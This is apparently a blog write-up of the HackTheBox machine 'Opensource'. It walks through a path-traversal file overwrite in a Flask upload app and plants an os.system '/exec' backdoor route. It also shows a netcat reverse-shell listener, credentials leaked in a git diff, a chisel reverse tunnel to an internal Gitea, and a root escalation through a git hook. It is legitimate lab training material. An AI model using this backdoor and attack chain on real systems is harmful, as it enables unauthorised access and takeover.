---
title: Opensource writeup
date: 2022-06-25 16:00:00 +0200
categories: [Writeup, HackTheBox]
tags: ["Easy-box", "chisel", "flask"]     # TAG names should always be lowercase
img_path: /assets/img/boxes/opensource/
image: # Thumbnail 
  src: OpenSource.png
  width: 1000   # in pixels
  height: 400   # in pixels
---               
## Summary

## Foothold
We start out by doing an nmap port scan:

```console
# Nmap 7.92 scan initiated Wed Jun  8 16:04:07 2022 as: nmap -sC -sV -o nmap/ini.txt opensource.htb
Nmap scan report for opensource.htb (10.129.160.73)
Host is up (0.067s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)
|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)
|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)
80/tcp   open     http    Werkzeug/2.1.2 Python/3.10.3
|_http-title: upcloud - Upload files for Free!
|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
...
3000/tcp filtered ppp
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jun  8 16:05:42 2022 -- 1 IP address (1 host up) scanned in 94.69 seconds
```
The system has 3 ports open, 22 80 and 3000. Port 80 is hosting a flask-based web application based on the http-server-header and port 3000 is hosting an unknown, filtered service. We start out by visitng the web application hosted on port 80:

![welcome page for opensource](welcome.png)
_Landing page for opensource_

The website allows us to download a zip archive containing the source code for the web application. 

The source code contains the following code:

```python
@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')
```

If we take a look at the `documentation` for the `os.path.join()` method, we gather that "If a component is an absolute path, all previous components are thrown away and joining continues from the absolute path component." This means that if we give the application a file named like so `/app/app/views.py`{: .filepath}, it will overwrite the `views.py`{: .filepath} of the app, which in this case is the file that handles the routes of the application. This means if we add a function like 

```python
@app.route('/exec')
def cmd():
    return os.system(request.args.get('cmd'))
```
We can then run commands on the system hosting the application. 

We can use burpsuite to intercept the upload request, and then rename the file.

![burp requests](burp.png)

We then get redirected to the upload page telling us we have successfully uploaded the file:

![Successful upload](upload.png)

If we attempt to access the exec endpoint with the argument "?cmd=ls" we get the following page:

![werkzeug error page](error.png)

This indicate that we successfully overwrote the views.py file, since the application seems to attempt to carry out the command. If we then use a URL encoded python reverse shell we get access to the container hosting the application

```console
┌──(bitis㉿workstation)-[~/htb/Machines/opensource]
└─$ nc -lvnp 4444              
listening on [any] 4444 ...
connect to [10.10.17.182] from (UNKNOWN) [10.129.82.65] 53948
/app #         
```

To gain a foothold on the actual system hosting the container, we need to do some more enumeration of the git repo we downloaded earlier. If we run `git branch` on it we see that a dev branch exists. We can then switch branches, check the logs and then differences between the different commits:

```console
┌──(bitis㉿workstation)-[~/htb/Machines/opensource/source]
└─$ git branch
* dev
  public
                                                                                                                                                                                                                                            
┌──(bitis㉿workstation)-[~/htb/Machines/opensource/source]
└─$ git log                                                                                                                                                                                                                             1 ⨯
commit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 (HEAD -> dev)
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:47:24 2022 +0200

    ease testing

commit be4da71987bbbc8fae7c961fb2de01ebd0be1997
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:46:54 2022 +0200

    added gitignore

commit a76f8f75f7a4a12b706b0cf9c983796fa1985820
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:46:16 2022 +0200

    updated

commit ee9d9f1ef9156c787d53074493e39ae364cd1e05
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:45:17 2022 +0200

    initial

┌──(bitis㉿workstation)-[~/htb/Machines/opensource/source]
└─$ git diff ee9d9f1 a76f8f7 
diff --git a/app/.vscode/settings.json b/app/.vscode/settings.json
new file mode 100644
index 0000000..5975e3f
--- /dev/null
+++ b/app/.vscode/settings.json
@@ -0,0 +1,5 @@
+{
+  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
+  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
+  "http.proxyStrictSSL": false
+}
...
```
The commit added the credentials `dev01:Soulless_Developer#2022`. 

Remembering that we found port 3000 in our portscan, but that it was filtered on our machine, we use chisel to port forward port 3000 to our machine. On the victim machine we do the following:

```console
┌──(bitis㉿workstation)-[~/htb/Machines/opensource]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.17.182] from (UNKNOWN) [10.129.82.65] 54294
/app # cd /tmp 
cd /tmp
/tmp # ./chisel client -v 10.10.17.182:8000 R:3000:172.17.0.1:3000
./chisel client -v 10.10.17.182:8000 R:3000:172.17.0.1:3000
2022/06/25 19:19:27 client: Connecting to ws://10.10.17.182:8000
2022/06/25 19:19:27 client: Handshaking...
2022/06/25 19:19:28 client: Sending config
2022/06/25 19:19:28 client: Connection error: server: Server cannot listen on R:3000=>172.17.0.1:3000
2022/06/25 19:19:28 client: Give up
/tmp # ./chisel client -v 10.10.17.182:8001 R:3000:172.17.0.1:3000
./chisel client -v 10.10.17.182:8001 R:3000:172.17.0.1:3000
2022/06/25 19:20:32 client: Connecting to ws://10.10.17.182:8001
2022/06/25 19:20:32 client: Handshaking...
2022/06/25 19:20:33 client: Sending config
2022/06/25 19:20:33 client: Connected (Latency 46.611837ms)
2022/06/25 19:20:33 client: tun: SSH connected

```
On the attacker machine
```console
┌──(bitis㉿workstation)-[~/tools]
└─$ ./chisel server --reverse -p 8001
2022/06/25 21:19:51 server: Reverse tunnelling enabled
2022/06/25 21:19:51 server: Fingerprint 0SM8R8ZA9ESFE6zEmRmfs2LEpK+bGOB/CVvKKez7GZc=
2022/06/25 21:19:51 server: Listening on http://0.0.0.0:8001
2022/06/25 21:20:31 server: session#1: tun: proxy#R:3000=>172.17.0.1:3000: Listening
```
Now anything we send to port 3000 on our machine will be send to port 3000 on the target host. 

When we visit `localhost:3000` we get greeted with the following: 

![gitea service](gitea.png)

We can then use the credentials found previously to login as dev01

![logged into gitea as dev01](loggedin.png)

When looking at the commits of dev01, we find an ssh key:

![dev01 ssh key](sshkey.png)

We can then save this ssh key and log in as dev01 on the target machine via ssh.

## Privilege escalation
Once logged in as dev01, we get and run pspy to snoop on any commands being run. 

```
2022/06/25 19:32:01 CMD: UID=0    PID=22743  | /bin/bash /usr/local/bin/git-sync 
2022/06/25 19:32:01 CMD: UID=0    PID=22744  | git commit -m Backup for 2022-06-25 
2022/06/25 19:32:01 CMD: UID=0    PID=22745  | /bin/bash /usr/local/bin/git-sync 
2022/06/25 19:32:01 CMD: UID=0    PID=22748  | git push origin main 
```
Based on the output we can tell that the root user is running git commands such as commit and push. If we consult GTFObins, we can tell that this is exploitable by adding a command we wish to run as root to a file named `.git/hooks/pre-commit.sample`{: .filepath}, renaming it and then waiting for root to commit something. 

![GTFObins](gtfobins.png)  

Once this is done we have root access. Rooted! 